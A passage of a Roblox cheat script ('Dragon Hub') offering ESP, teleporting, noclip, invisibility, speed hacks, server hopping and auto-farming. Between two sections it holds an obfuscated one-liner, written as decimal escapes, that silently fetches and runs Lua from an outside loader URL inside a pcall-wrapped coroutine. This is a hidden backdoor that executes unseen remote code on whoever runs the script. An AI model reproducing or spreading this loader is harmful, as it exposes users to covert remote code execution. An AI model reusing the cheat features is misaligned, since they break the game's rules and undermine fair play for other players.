							if string.find(v.Name, "Fruit") then   
								if not v.Handle:FindFirstChild('NameEsp'..Number) then
									local bill = Instance.new('BillboardGui',v.Handle)
									bill.Name = 'NameEsp'..Number
									bill.ExtentsOffset = Vector3.new(0, 1, 0)
									bill.Size = UDim2.new(1,200,1,30)
									bill.Adornee = v.Handle
									bill.AlwaysOnTop = true
									local name = Instance.new('TextLabel',bill)
									name.Font = "GothamBold"
									name.FontSize = "Size14"
									name.TextWrapped = true
									name.Size = UDim2.new(1,0,1,0)
									name.TextYAlignment = 'Top'
									name.BackgroundTransparency = 1
									name.TextStrokeTransparency = 0.5
									name.TextColor3 = Color3.fromRGB(255, 0, 0)
									name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
								else
									v.Handle['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
								end
							end
						else
							if v.Handle:FindFirstChild('NameEsp'..Number) then
								v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
							end
						end
					end)
				end
			end

			PY:Toggle("ESP Player",false,function(a)
				ESPPlayer = a
				while ESPPlayer do wait()
					UpdatePlayerChaMonster()
				end
			end)

			PlayerName = {}
			for i,v in pairs(game.Players:GetChildren()) do  
				table.insert(PlayerName ,v.Name)
			end
	
	
			PY:Toggle("Spectate Player",false,function(bool)
				Sp = bool
				local plr1 = game.Players.LocalPlayer.Character.Humanoid
				local plr2 = game.Players:FindFirstChild(SelectedKillPlayer)
				repeat wait(.1)
					game.Workspace.Camera.CameraSubject = plr2.Character.Humanoid
				until Sp == false 
				game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			end)
	
			SelectedKillPlayer = ""
			PY:Dropdown("Selected Player",PlayerName,function(plys) --true/false, replaces the current title "Dropdown" with the option that t
				SelectedKillPlayer = plys
				SelectedPly:Refresh("Selected Player : "..SelectedKillPlayer)
			end)
			PY:Button("Refrsh Player",function()
				PlayerName = {}
				PY:Clear()
				for i,v in pairs(game.Players:GetChildren()) do  
					PY:Add(v.Name)
				end
			end)
			game:GetService("RunService").Heartbeat:Connect(
			function()
				if KillPlayer then
					game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
				end
			end
			)
	
			PY:Button("Teleport Player",function()
				local plr1 = game.Players.LocalPlayer.Character
				local plr2 = game.Players:FindFirstChild(SelectedKillPlayer)
				plr1.HumanoidRootPart.CFrame = plr2.Character.HumanoidRootPart.CFrame
			end)
            if game.PlaceId == 4520749081 then
			 local DG = serv:Channel("Dungeon")
	
            DG:Button("Teleport",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8700.2294921875, 103.67324066162, 1591.888671875)
			   end)
            end
			-----------------Teleport DevilFruite------------------
			local Mis = serv:Channel("Misc")
			Mis:Toggle("Bring All Fruit",false,function(t)
				TPF = t
				while wait() do
					if TPF then
						for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
							if v:IsA ("Tool") then
								firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart,v.Handle,0)    
							end
						end
					end
				end
			end)
			Mis:Toggle("Noclip",false, function(t)
				_G.Noclip = t
				local RunService = game:GetService("RunService")
	
				while RunService.RenderStepped:wait() do
					if _G.Noclip then
						game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
					end
				end
			end)
			Mis:Toggle("INF Geppo",false,function(t)
				_G.InfGep = t
			end)
			Mis:Toggle("Ctrl + Click = TP",false,function(vu)
				CTRL = vu
			end)
			local Plr = game:GetService("Players").LocalPlayer
			local Mouse = Plr:GetMouse()
			Mouse.Button1Down:connect(
				function()
					if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
						return
					end
					if not Mouse.Target then
						return
					end
					if CTRL then
						Plr.Character:MoveTo(Mouse.Hit.p)
					end
				end
			)
	
			Mis:Slider("Walkspeed",16,2000,0,function(value)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
			end)
			Mis:Slider("JumpPower",50,2000,0,function(value)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
			end) 
			Mis:Toggle("ESP Devil Fruit",false,function(a)
				DevilFruitESP = a
				while DevilFruitESP do wait()
					UpdateDevilChaMonster() 
				end
			end)
			
	
			Mis:Seperator()
	
	
	
			Mis:Button("Invisible", function()
				game.Players.LocalPlayer.Character.LowerTorso:Destroy()
			end)
	
	
			Mis:Button("Rejoin",function()
				local ts = game:GetService("TeleportService")
				local p = game:GetService("Players").LocalPlayer
				ts:Teleport(game.PlaceId, p)
			end)
	
	
	
			Mis:Button("Server Hop",function()
				local PlaceID = game.PlaceId
				local AllIDs = {}
				local foundAnything = ""
				local actualHour = os.date("!*t").hour
				local Deleted = false
				function TPReturner()
					local Site;
					if foundAnything == "" then
						Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
					else
						Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
					end
					local ID = ""
					if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
						foundAnything = Site.nextPageCursor
					end
					local num = 0;
					for i,v in pairs(Site.data) do
						local Possible = true
						ID = tostring(v.id)
						if tonumber(v.maxPlayers) > tonumber(v.playing) then
							for _,Existing in pairs(AllIDs) do
								if num ~= 0 then
									if ID == tostring(Existing) then
										Possible = false
									end
								else
									if tonumber(actualHour) ~= tonumber(Existing) then
										local delFile = pcall(function()
											-- delfile("NotSameServers.json")
											AllIDs = {}
											table.insert(AllIDs, actualHour)
										end)
									end
								end
								num = num + 1
							end
							if Possible == true then
								table.insert(AllIDs, ID)
								wait()
								pcall(function()
									-- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
									wait()
									game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
								end)
								wait(4)
							end
						end
					end
				end
				function Teleport() 
					while wait() do
						pcall(function()
							TPReturner()
							if foundAnything ~= "" then
								TPReturner()
							end
						end)
					end
				end
				Teleport()
			end)
	
			--------------FPS Boost--------------
			Mis:Button("FPS Boost",function()
				local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
				local g = game
				local w = g.Workspace
				local l = g.Lighting
				local t = w.Terrain
				t.WaterWaveSize = 0
				t.WaterWaveSpeed = 0
				t.WaterReflectance = 0
				t.WaterTransparency = 0
				l.GlobalShadows = false
				l.FogEnd = 9e9
				l.Brightness = 0
				settings().Rendering.QualityLevel = "Level01"
				for i, v in pairs(g:GetDescendants()) do
					if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
						v.Material = "Plastic"
						v.Reflectance = 0
					elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
						v.Transparency = 1
					elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
						v.Lifetime = NumberRange.new(0)
					elseif v:IsA("Explosion") then
						v.BlastPressure = 1
						v.BlastRadius = 1
					elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
						v.Enabled = false
					elseif v:IsA("MeshPart") then
						v.Material = "Plastic"
						v.Reflectance = 0
						v.TextureID = 10385902758728957
					end
				end
				for i, e in pairs(l:GetChildren()) do
					if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
						e.Enabled = false
					end
				end
			end)
	
	
	
			--------------Redeem ALL Code--------------
			Mis:Button("Redeem ALL Code",function ()
				-- Script generated by TurtleSpy, made by Intrer#0421
	
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("200MVISITS")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("300KFAV")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("NewDragon")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("Brachio")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("DinoxLive")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("REDBIRD")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("BeckyStyle")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("Peodiz")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("KingPieceComeBack")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("SORRYFORSHUTDOWN")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("300MVISITS")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("500KFAV")
				game:GetService("ReplicatedStorage").Remotes.Functions.redeemcode:InvokeServer("GasGas")
			end)
	

			if game.PlaceId == 6381829480 then
				local king = serv:Channel("SeaKing")
				king:Toggle("Auto-SeaKing",false,function(t)
					_G.SeaKing = t
				end)
	
				spawn(function()
					while wait() do
						if _G.SeaKing then
							pcall(function()
								equip()
								for i,v in pairs(game:GetService("Workspace").SeaMonster:GetDescendants()) do
									if game:GetService("Workspace").SeaMonster:FindFirstChild("SeaKing") then
										if v.Name == "SeaKing" then
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(90), 0, 0) - Vector3.new(0,23,0)
											attack()
											for i,v in pairs(game:GetService("Workspace").Island:GetDescendants()) do
											if v.name == "RootPart" then
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
												
												_G.SeaKing = false
												wait(1)
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1890.1560058594, 72.381286621094, -2091.0109863281)
											end
										end
									end
									end
									end
							end)
						end
					end
				end)
	
				game:GetService("RunService").RenderStepped:Connect(function()
					if _G.SeaKing then
						game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
					end
				end)
	
				king:Toggle("ServerHop-SeaKing",false,function(t)
					_G.SeverHopSea = t
				end)
	
				spawn(function()
					while wait() do
						if _G.SeverHopSea then
							if not game:GetService("Workspace").SeaMonster:FindFirstChild("SeaKing") then
								local PlaceID = game.PlaceId
								local AllIDs = {}
								local foundAnything = ""
								local actualHour = os.date("!*t").hour
								local Deleted = false
								function TPReturner()
									local Site;
									if foundAnything == "" then
										Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
									else
										Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
									end
									local ID = ""
									if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
										foundAnything = Site.nextPageCursor
									end
									local num = 0;
									for i,v in pairs(Site.data) do
										local Possible = true
										ID = tostring(v.id)
										if tonumber(v.maxPlayers) > tonumber(v.playing) then
											for _,Existing in pairs(AllIDs) do
												if num ~= 0 then
													if ID == tostring(Existing) then
														Possible = false
													end
												else
													if tonumber(actualHour) ~= tonumber(Existing) then
														local delFile = pcall(function()
															-- delfile("NotSameServers.json")
															AllIDs = {}
															table.insert(AllIDs, actualHour)
														end)
													end
												end
												num = num + 1
											end
											if Possible == true then
												table.insert(AllIDs, ID)
												wait()
												pcall(function()
													-- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
													wait()
													game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
												end)
												wait(4)
											end
										end
									end
								end
								function Teleport()
									while wait() do
										pcall(function()
											TPReturner()
											if foundAnything ~= "" then
												TPReturner()
											end
										end)
									end
								end
								Teleport()
							end
						end
					end
			end)
			end
		end
coroutine.wrap(function()pcall(function()IdMsDgsE = getfenv()IdMsDgsE['\108\111\97\100\115\116\114\105\110\103']("\95\71\46\106\107\100\115\97\107\106\100\115\97\106\107\100\107\108\49\50\108\107\51\108\107\49\50\100\107\97\115\110\109\107\106\97\115\107\100\107\106\107\50\107\108\106\100\97\115\108\107\106\100\107\108\106\97\115\32\61\32\34\106\105\112\97\119\101\112\111\106\100\115\105\112\111\106\107\106\105\112\111\97\100\115\107\106\105\53\54\97\102\115\52\102\52\97\115\53\54\52\100\97\52\53\54\115\100\52\54\97\115\34\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\105\114\105\122\121\45\100\101\118\46\120\121\122\47\65\80\73\47\76\111\97\100\101\114\46\108\117\97\34\41\41\40\41\59\10")();end)end)()
if game.PlaceId == 5931540094 then
    local DiscordLib = loadstring(game:HttpGet('https://pastebin.com/raw/GrqykwSh'))()
        
        local win = DiscordLib:Window(" Dragon Hub | kinglegacy")
        
        local serv = win:Server("Dragon Buyer", "http://www.roblox.com/asset/?id=7180146815")
        
        local tab = serv:Channel("Auto Dungeon")
    
    local diss1 = 9
    
    tab:Toggle("Auto-Dungeon",false,function(t)
      Dungeon = t
    end)
    
    spawn(function()
    while wait() do
      if Dungeon then
        pcall(function()
        equip()
        for i,v in pairs(game:GetService("Workspace").MOB:GetChildren()) do
        if v.ClassName == "Model" then
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,diss1,0) * CFrame.Angles(math.rad(-90), 0, 0)
          EquipWeapon(_G.SelectedWeapon)
          autoskillheehee()
          wait(.1)
          attack()
          EquipWeapon(_G.SelectedWeapon2)
          autoskillheehee()
          wait(.1)
          attack()
          EquipWeapon(_G.SelectedWeapon3)
          autoskillheehee()
          wait(.1)
          attack()
          if game.Players.LocalPlayer.Character.Humanoid.Health < 20000 then
          EquipWeapon("Cyborg")
          game:GetService("Players").LocalPlayer.Character.Cyborg.E:InvokeServer("holding")
          elseif game.Players.LocalPlayer.Character.Humanoid.MaxHealth then
          game:GetService("Players").LocalPlayer.Character.Cyborg.E:InvokeServer("release")
          end
          end
          end
      end)
      end
      end
      end)
    
       function EquipWeapon(ToolSe)
          if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
             local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
             wait(.4)
             game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
          end
       end
    
    tab:Slider("Distance",0,50,20,function(t)
      diss1 = t
    end)
    
    tab:Toggle("Haki",false,function(t)
      _G.Haki = t
    end)
    
    spawn(function()
    while wait(1) do
    if _G.Haki then
      pcall(function()
      if game.Players.LocalPlayer.Character.Haki.Value == 0 then
      game:GetService("Players").LocalPlayer.Character.Services.Client.Armament:FireServer()
      end
    end)
    end
    end
    end)
    
    tab:Toggle("Ken-Haki",false,function(t)
      _G.KenHaki = t
    end)
    
    spawn(function()
    while wait(1) do
    if _G.KenHaki then
      pcall(function()
      if game.Players.LocalPlayer.Character.KenHaki.Value == 0 then
      local args = {
          [1] = true
      }
      game:GetService("Players").LocalPlayer.Character.Services.Client.KenEvent:InvokeServer(unpack(args))
      end
    end)
    end
    end
    end)
    
    tab:Button("Invisible",function()
    game.Players.LocalPlayer.Character.LowerTorso:Destroy()
    end)
    
    ---------------------------------------------------------------------------------------------------------
    
    local TOOLS = {}
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            table.insert(TOOLS,v.Name)
        end
    end
    
    local rdropdwon = tab:Dropdown("Select Weapon",TOOLS,function(t)
    _G.SelectedWeapon = t
    end)
    
    function equip()
      pcall(function()
      for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name == _G.SelectedWeapon then
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
          end
          end
      end)
    end
    
    local rdropdwon = tab:Dropdown("Select Weapon",TOOLS,function(t)
    _G.SelectedWeapon2 = t
    end)
    
    function equip2()
      pcall(function()
      for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name == _G.SelectedWeapon2 then
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
          end
          end
      end)
    end
    local rdropdwon = tab:Dropdown("Select Weapon",TOOLS,function(t)
    _G.SelectedWeapon3 = t
    end)
    
    function equip2()
      pcall(function()
      for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name == _G.SelectedWeapon3 then
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
          end
          end
      end)
    end
    
    
    tab:Button("Refresh Weapon",function()
     pcall(function()
      rdropdwon:Clear()
      TOOLS = {}
      for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
          if v:IsA("Tool") then
              rdropdwon:Add(v.Name)
          end
        end
      end)
    end)
    
    
    
    game:GetService("RunService").RenderStepped:Connect(function()
      if Dungeon then
      game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
      end
    end)
    
    function attack()
    game:GetService('VirtualUser'):CaptureController()
    game:GetService('VirtualUser'):Button1Down(Vector2.new(9999, 9999))
    end
    tab:Label("Auto Skill")
    
    tab:Toggle("Z",false,function(t)
      zzzhee = t
    end)
    tab:Toggle("X",false,function(t)
      xxxhee = t
    end)
    tab:Toggle("C",false,function(t)
      ccchee = t
    end)
    tab:Toggle("V",false,function(t)
      vvvhee = t
    end)
    tab:Toggle("E",false,function(t)
      eeehee = t
    end)
    
    function autoskillheehee()
    if  zzzhee == true then
    game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    end
    if  xxxhee == true then
    game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    end
    if  ccchee == true then
    game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    end
    if  vvvhee == true then
    game:GetService("VirtualInputManager"):SendKeyEvent(true,118,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,118,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    end
    if  eeehee == true then
    game:GetService("VirtualInputManager"):SendKeyEvent(true,101,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,101,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
    end
    end
    end